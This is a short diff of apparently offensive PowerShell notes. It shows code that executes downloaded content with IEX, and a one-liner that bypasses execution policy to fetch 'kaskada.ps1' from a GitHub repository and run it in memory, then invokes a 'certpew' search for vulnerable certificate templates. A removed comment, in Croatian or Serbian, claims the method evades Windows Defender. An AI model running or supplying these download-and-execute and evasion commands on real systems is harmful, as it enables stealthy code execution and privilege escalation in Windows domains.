@@ -11,7 +11,8 @@ $reader=[System.IO.StreamReader]::new($respstream)
 $content=$reader.ReadToEnd()
 IEX($content)
 
-Certpew ucita kaskada i onda ju zovete kroz funkciju i to Win Defender ne kuzi - testirah
+------------------------------------------------------------------
+
 powershell -nop -exec -bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inkz1337/ptest_related/main/kaskada.ps1'); invoke-certpew find /vulnerable""
 #>
 
